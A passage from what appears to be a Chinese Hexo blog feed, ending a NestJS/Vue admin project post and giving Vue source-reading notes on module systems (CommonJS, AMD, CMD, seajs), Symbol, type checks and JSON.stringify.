class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Controller, Get &#125; <span class="keyword">from</span> <span class="string">"@nestjs/common"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Crud &#125; <span class="keyword">from</span> <span class="string">"nestjs-mongoose-crud"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Course &#125; <span class="keyword">from</span> <span class="string">"@libs/db/models/course.model"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; InjectModel &#125; <span class="keyword">from</span> <span class="string">"nestjs-typegoose"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ReturnModelType &#125; <span class="keyword">from</span> <span class="string">"@typegoose/typegoose"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ApiUseTags &#125; <span class="keyword">from</span> <span class="string">"@nestjs/swagger"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Crud</span>(&#123;</span><br><span class="line">  model: Course</span><br><span class="line">&#125;)</span><br><span class="line"><span class="meta">@Controller</span>(<span class="string">"courses"</span>)</span><br><span class="line"><span class="meta">@ApiUseTags</span>(<span class="string">"课程"</span>) <span class="comment">// 为其添加分类，作用于swagger</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> CoursesController &#123;</span><br><span class="line">  <span class="keyword">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">    <span class="meta">@InjectModel</span>(Course) <span class="keyword">private</span> readonly model: ReturnModelType&lt;<span class="keyword">typeof</span> Course&gt;</span></span><br><span class="line"><span class="params">  </span>) &#123;&#125; <span class="comment">// 使用@InjectModel注入模型，最后也可以使用ReturnModelType&lt;typeof Course&gt;定义改模型类型</span></span><br><span class="line">  <span class="meta">@Get</span>(<span class="string">"option"</span>) <span class="comment">// courses的子路由，请求方式为get，即是localhost:3000/courses/option</span></span><br><span class="line">  option() &#123;</span><br><span class="line">    <span class="comment">// 函数名称不影响，类型@Watch()写法</span></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      title: <span class="string">"课程管理"</span>,</span><br><span class="line">      column: [</span><br><span class="line">        &#123;</span><br><span class="line">          prop: <span class="string">"name"</span>,</span><br><span class="line">          label: <span class="string">"课程名称"</span>,</span><br><span class="line">          sortable: <span class="literal">true</span>, <span class="comment">// 允许排序</span></span><br><span class="line">          search: <span class="literal">true</span>, <span class="comment">// 增加搜索框</span></span><br><span class="line">          regex: <span class="literal">true</span>, <span class="comment">// 允许通过正则表达式搜索，即支持模糊查询</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          prop: <span class="string">"cover"</span>,</span><br><span class="line">          label: <span class="string">"课程封面图"</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><blockquote><p>admin\src\views\ResourceCrud.vue</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>— <em>待更新-2020-02-28</em> —</p><h1 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h1><blockquote><p>参考资料：全栈之巅</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="项目记录" scheme="http://yoursite.com/categories/%E9%A1%B9%E7%9B%AE%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="Vue" scheme="http://yoursite.com/tags/Vue/"/>
    
      <category term="笔记" scheme="http://yoursite.com/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="nest" scheme="http://yoursite.com/tags/nest/"/>
    
      <category term="element" scheme="http://yoursite.com/tags/element/"/>
    
      <category term="electron" scheme="http://yoursite.com/tags/electron/"/>
    
  </entry>
  
  <entry>
    <title>Vue源码研读笔记</title>
    <link href="http://yoursite.com/Vue/20200228-5414158b.html"/>
    <id>http://yoursite.com/Vue/20200228-5414158b.html</id>
    <published>2020-02-28T07:51:02.000Z</published>
    <updated>2021-04-08T03:18:06.359Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h1><p>源码解读：<a href="https://github.com/ashen114/CodingFun/blob/master/sourceCode/vue.js" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/ashen114/CodingFun/blob/master/sourceCode/vue.js</a></p><blockquote><p>比较习惯先看整体再到部分，因此从整体入手，逐步拜读 Vue 源码，学艺不精，若有理解错误之处，恳请指点。</p></blockquote><h2 id="研究对象"><a href="#研究对象" class="headerlink" title="研究对象"></a>研究对象</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">global, factory</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 检测上下文环境是否为Node</span></span><br><span class="line">  <span class="keyword">typeof</span> exports === <span class="string">'object'</span> &amp;&amp; <span class="keyword">typeof</span> <span class="built_in">module</span> !== <span class="string">'undefined'</span> ? <span class="built_in">module</span>.exports = factory() :</span><br><span class="line">  <span class="keyword">typeof</span> define === <span class="string">'function'</span> &amp;&amp; define.amd ? define(factory) :</span><br><span class="line">  (global = global || self, global.Vue = factory());</span><br><span class="line">&#125;(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; ...</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><blockquote><p>参考链接：<a href="https://www.iteye.com/blog/zccst-2215317" rel="external nofollow noopener noreferrer" target="_blank">https://www.iteye.com/blog/zccst-2215317</a> <a href="https://www.jianshu.com/p/013b37a677f0" rel="external nofollow noopener noreferrer" target="_blank">https://www.jianshu.com/p/013b37a677f0</a><br>CommonJS 用在服务器端，同步的，例如 nodejs<br>AMD,CMD 用于浏览器端，异步，例如 request 和 seajs</p></blockquote><h3 id="CommonJS"><a href="#CommonJS" class="headerlink" title="CommonJS"></a>CommonJS</h3><p>根据 CommonJS 规范，一个单独的文件就是一个模块。加载模块使用 require 方法，该方法读取一个文件并执行，最后返回文件内部的 exports 对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//exports对象上的方法和变量是公有的</span></span><br><span class="line"><span class="keyword">var</span> foobar = <span class="keyword">new</span> foobar();</span><br><span class="line">exports.foobar = foobar;</span><br><span class="line"></span><br><span class="line"><span class="comment">//require方法默认读取js文件，所以可以省略js后缀</span></span><br><span class="line"><span class="keyword">var</span> test = <span class="built_in">require</span>(<span class="string">"./boobar"</span>).foobar;</span><br><span class="line"></span><br><span class="line">test.bar();</span><br></pre></td></tr></table></figure><p>CommonJS 加载模块是同步的，所以只有加载完成才能执行后面的操作。像 Node.js 主要用于服务器的编程，加载的模块文件一般都已经存在本地硬盘，所以加载起来比较快，不用考虑异步加载的方式，所以 CommonJS 规范比较适用。但如果是浏览器环境，要从服务器加载模块，这是就必须采用异步模式。所以就有了 AMD CMD 解决方案。</p><h3 id="AMD"><a href="#AMD" class="headerlink" title="AMD"></a>AMD</h3><p>AMD 是 RequireJS 在推广过程中对模块定义的规范化产出<br>AMD 异步加载模块。它的模块支持对象 函数 构造器 字符串 JSON 等各种类型的模块。<br>适用 AMD 规范适用 define 方法定义模块。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过数组引入依赖 ，回调函数通过形参传入依赖</span></span><br><span class="line">define([<span class="string">'someModule1'</span>, ‘someModule2’], <span class="function"><span class="keyword">function</span> (<span class="params">someModule1, someModule2</span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">/// someing</span></span><br><span class="line">        someModule1.test();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="attr">foo</span>: foo&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>AMD 规范允许输出模块兼容 CommonJS 规范，这时 define 方法如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="function"><span class="keyword">function</span>(<span class="params">require, exports, module</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> reqModule = <span class="built_in">require</span>(<span class="string">"./someModule"</span>);</span><br><span class="line">  requModule.test();</span><br><span class="line">  exports.asplode = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//someing</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h3><p>CMD 是 SeaJS 在推广过程中对模块定义的规范化产出</p><p>CMD 和 AMD 的区别有以下几点：</p><p>1.对于依赖的模块 AMD 是提前执行，CMD 是延迟执行。不过 RequireJS 从 2.0 开始，也改成可以延迟执行（根据写法不同，处理方式不通过）。</p><p>2.CMD 推崇依赖就近，AMD 推崇依赖前置。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//AMD</span></span><br><span class="line">define([<span class="string">'./a'</span>,<span class="string">'./b'</span>], <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//依赖一开始就写好</span></span><br><span class="line">    a.test();</span><br><span class="line">    b.test();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//CMD</span></span><br><span class="line">define(<span class="function"><span class="keyword">function</span> (<span class="params">requie, exports, module</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//依赖可以就近书写</span></span><br><span class="line">    <span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">'./a'</span>);</span><br><span class="line">    a.test();</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">//软依赖</span></span><br><span class="line">    <span class="keyword">if</span> (status) &#123;</span><br><span class="line">        <span class="keyword">var</span> b = requie(<span class="string">'./b'</span>);</span><br><span class="line">        b.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>虽然 AMD 也支持 CMD 写法，但依赖前置是官方文档的默认模块定义写法。</p><h3 id="seajs"><a href="#seajs" class="headerlink" title="seajs"></a>seajs</h3><p>1、引入 seajs<br>在文件夹中放入 seajs，相关的 html 页面引入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"yourfile/js/sea.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2、seajs 经常使用的 api 有 use，config<br>seajs.use 主要用于载入入口模块。入口模块相当于 C 语言的 main 函数，同时也是整个模块依赖树的根。seajs.use 的用法如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一模式</span></span><br><span class="line">seajs.use(<span class="string">"./a"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//回调模式</span></span><br><span class="line">seajs.use(<span class="string">"./a"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  a.run();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//多模块模式</span></span><br><span class="line">seajs.use([<span class="string">"./a"</span>, <span class="string">"./b"</span>], <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  a.run();</span><br><span class="line">  b.run();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>AMD 的 api 默认是一个当多个用，CMD 严格的区分推崇职责单一。例如：AMD 里 require 分全局的和局部的。CMD 里面没有全局的 require,提供 seajs.use()来实现模块系统的加载启动。CMD 里每个 API 都简单纯粹。<br>require 是 AMD 规范引入方式<br>import 是 es6 的一个语法标准，如果要兼容浏览器的话必须转化成 es5 的语法。</p><blockquote><p>参考链接：<a href="https://www.cnblogs.com/xiaobai110/p/6654522.html" rel="external nofollow noopener noreferrer" target="_blank">RequireJS、SeaJS 的区别</a></p></blockquote><h2 id="研究对象-1"><a href="#研究对象-1" class="headerlink" title="研究对象"></a>研究对象</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPrimitive</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="keyword">typeof</span> value === <span class="string">"string"</span> ||</span><br><span class="line">    <span class="keyword">typeof</span> value === <span class="string">"number"</span> ||</span><br><span class="line">    <span class="comment">// $flow-disable-line</span></span><br><span class="line">    <span class="keyword">typeof</span> value === <span class="string">"symbol"</span> ||</span><br><span class="line">    <span class="keyword">typeof</span> value === <span class="string">"boolean"</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>JavaScript 语言规定了 7 种语言类型，他们分别是：<br>Number（数字）<br>Boolean（布尔值）<br>String（字符串）<br>Null （空）<br>Undefined （未定义）<br>Symbol （es6 新增，表示独一无二的值）<br>Object（对象）<br>其中，除了 Object 是对象类型，其他的都是原始（基本）类型。</p><h3 id="symbol"><a href="#symbol" class="headerlink" title="symbol"></a>symbol</h3><p>ES5 的对象属性名都是字符串，这就很容易造成属性名的冲突。为了防止属性名冲突，创建独一无二的变量名，在 ES6 中引入了 Symbol 基本数据类型。Symbol() 函数返回的是 Symbol 类型的值，该类型具有静态方法和静态属性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Symbol</span>(<span class="string">"ashen"</span>) == <span class="built_in">Symbol</span>(<span class="string">"ashen"</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>借助该特性，可以将其作为对象的属性名，保证不会出现同名属性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="built_in">Symbol</span>(<span class="string">"shen"</span>);</span><br><span class="line"><span class="keyword">let</span> a = &#123;&#125;;</span><br><span class="line">a[name] = <span class="string">"ashen"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = &#123;</span><br><span class="line">  [name]: <span class="string">"ashen"</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> c = &#123;&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(c, name, &#123; <span class="attr">value</span>: <span class="string">"ashen"</span> &#125;); <span class="comment">// c = &#123; Symbol(shen):"ashen" &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// a,b,c的值都为&#123;Symbol(shen): "ashen"&#125;,然而三者并不相等</span></span><br></pre></td></tr></table></figure><h2 id="研究对象-2"><a href="#研究对象-2" class="headerlink" title="研究对象"></a>研究对象</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidArrayIndex</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> n = <span class="built_in">parseFloat</span>(<span class="built_in">String</span>(val));</span><br><span class="line">  <span class="keyword">return</span> n &gt;= <span class="number">0</span> &amp;&amp; <span class="built_in">Math</span>.floor(n) === n &amp;&amp; <span class="built_in">isFinite</span>(val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h3><p>isFinite(number) 是 JavaScript 内置函数，用于判断 number 对象是否可以转换成一个有限的数字。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">isFinite</span>(<span class="number">123</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">isFinite</span>(<span class="string">"123"</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">isFinite</span>(<span class="string">"123a"</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h3 id="Math-对象"><a href="#Math-对象" class="headerlink" title="Math 对象"></a>Math 对象</h3><p>Math 对象用于执行数学任务。<br>Math 对象并不像 Date 和 String 那样是对象的类，因此没有构造函数 Math()。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Math</span>.floor(<span class="number">1234.567</span>); <span class="comment">// 向下取整数，得到123</span></span><br></pre></td></tr></table></figure><h2 id="研究对象-3"><a href="#研究对象-3" class="headerlink" title="研究对象"></a>研究对象</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toString</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> val == <span class="literal">null</span></span><br><span class="line">    ? <span class="string">""</span> <span class="comment">// 若为null，则返回""</span></span><br><span class="line">    : <span class="built_in">Array</span>.isArray(val) || (isPlainObject(val) &amp;&amp; val.toString === _toString)</span><br><span class="line">    ? <span class="built_in">JSON</span>.stringify(val, <span class="literal">null</span>, <span class="number">2</span>)</span><br><span class="line">    : <span class="built_in">String</span>(val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类型判断"><a href="#类型判断" class="headerlink" title="类型判断"></a>类型判断</h2><p>判断数据是否为 array 数组类型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>];</span><br><span class="line"><span class="built_in">Array</span>.isArray(arr); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h2 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> _ArrtoString = <span class="built_in">Array</span>.prototype.toString;</span><br><span class="line"><span class="keyword">let</span> _ObjtoString = <span class="built_in">Object</span>.prototype.toString;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>];</span><br><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">name</span>: <span class="string">"a"</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以用于判断数值是什么类型</span></span><br><span class="line">arr.toString == _ArrtoString; <span class="comment">// true</span></span><br><span class="line">arr.toString == _ObjtoString; <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">obj.toString == _ObjtoString; <span class="comment">// true</span></span><br><span class="line">obj.toString == _ArrtoString; <span class="comment">// false</span></span><br></pre></td></tr></table></figure><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><h3 id="JSON-stringfy"><a href="#JSON-stringfy" class="headerlink" title="JSON.stringfy"></a>JSON.stringfy</h3><blockquote><p>可以将对象转换为字符串<br>语法<br>JSON.stringify(value[, replacer[, space]])<br>参数说明：<br>value: 必需， 要转换的 JavaScript 值（通常为对象或数组）。<br>replacer: 可选。用于转换结果的函数或数组。如果 replacer 为函数，则 JSON.stringify 将调用该函数，并传入每个成员的键和值。使用返回值而不是原始值。如果此函数返回 undefined，则排除成员。根对象的键是一个空字符串：””。如果 replacer 是一个数组，则仅转换该数组中具有键值的成员。成员的转换顺序与键在数组中的顺序一样。当 value 参数也为数组时，将忽略 replacer 数组。<br>space:可选，文本添加缩进、空格和换行符，如果 space 是一个数字，则返回值文本在每个级别缩进指定数目的空格，如果 space 大于 10，则文本缩进 10 个空格。space 也可以使用非数字，如：\t。</p></blockquote><p><a href="https://baijiahao.baidu.com/s?id=1606340664976316132&amp;wfr=spider&amp;for=pc" rel="external nofollow noopener noreferrer" target="_blank">JSON.stringify 的使用细节</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> val = &#123; <span class="attr">name</span>: <span class="string">"ahsen"</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * val是原数据value;</span></span><br><span class="line"><span class="comment"> * null为用于转换结果的函数或数组replacer;</span></span><br><span class="line"><span class="comment"> * 2为分别前插入2个空格,若为字符串，则是分别前插入字符串...;</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(val, <span class="literal">null</span>, <span class="number">2</span>);</span><br><span class="line"><span class="comment">// 输出应为</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//   name:'ashen'</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 其中null的用法可以有如下：</span></span><br><span class="line"><span class="comment">// 1. 通过函数处理数组(arr,function)</span></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="string">"a"</span>, <span class="string">"b"</span>];</span><br><span class="line"><span class="keyword">let</span> json = <span class="built_in">JSON</span>.stringify(arr, changeArr); <span class="comment">// 得到 ""A,B""</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">changeArr</span>(<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value); <span class="comment">// ["a","b"]</span></span><br><span class="line">  <span class="keyword">return</span> value.toString().toUpperCase(); <span class="comment">// 将value转为字符串"a,b" 然后转为大写"A,B"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 通过函数处理对象(obj,function)</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  name: <span class="string">"ashen"</span>,</span><br><span class="line">  age: <span class="string">"18"</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> json = <span class="built_in">JSON</span>.stringify(obj, changeObj); <span class="comment">// 得到""ASHEN""</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">changeObj</span>(<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(value); <span class="comment">// &#123; name:"ashen",age:"18" &#125;</span></span><br><span class="line">  <span class="keyword">return</span> value.name.toString().toUpperCase(); <span class="comment">//将value中的name的属性转为大写</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 通过数组与数组组合，结果第二个数组被忽略(arr1,arr2)</span></span><br><span class="line"><span class="keyword">let</span> arr1 = [<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>];</span><br><span class="line"><span class="keyword">let</span> arr2 = [<span class="string">"d"</span>, <span class="string">"e"</span>];</span><br><span class="line"><span class="keyword">let</span> json = <span class="built_in">JSON</span>.stringify(arr1, arr2); <span class="comment">// 得到"["a","b","c"]"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 通过对象与数组结合，结果显示为若数组的值和对象的键都存在的，则保留，过滤掉两者不共同拥有的部分</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  name: <span class="string">"ashen"</span>,</span><br><span class="line">  age: <span class="string">"18"</span>,</span><br><span class="line">  height: <span class="string">"180cm"</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> arr = [<span class="string">"name"</span>, <span class="string">"age"</span>, <span class="string">"sex"</span>];</span><br><span class="line"><span class="keyword">let</span> json1 = <span class="built_in">JSON</span>.stringify(obj, arr); <span class="comment">// 得到 "&#123;"name":"ashen","age":"18"&#125;"  分析：由于arr中不存在height及obj中不存在sex，因此两者被过滤，剩下两者都存在的</span></span><br><span class="line"><span class="keyword">let</span> json2 = <span class="built_in">JSON</span>.stringify(arr, obj); <span class="comment">// 得到 "["name","age","sex"]" 结果和定义的arr一样</span></span><br></pre></td></tr></table></figure><h3 id="String-val"><a href="#String-val" class="headerlink" title="String(val)"></a>String(val)</h3><p>适用于转换转换非对象类型的数据为字符串类型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">String</span>(num); <span class="comment">// "1"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> arr = [<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>];</span><br><span class="line"><span class="built_in">String</span>(arr); <span class="comment">// "a,b,c"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  name: <span class="string">"ashen"</span>,</span><br><span class="line">  age: <span class="string">"18"</span>,</span><br><span class="line">  height: <span class="string">"180cm"</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">String</span>(obj); <span class="comment">// "[object Object]" 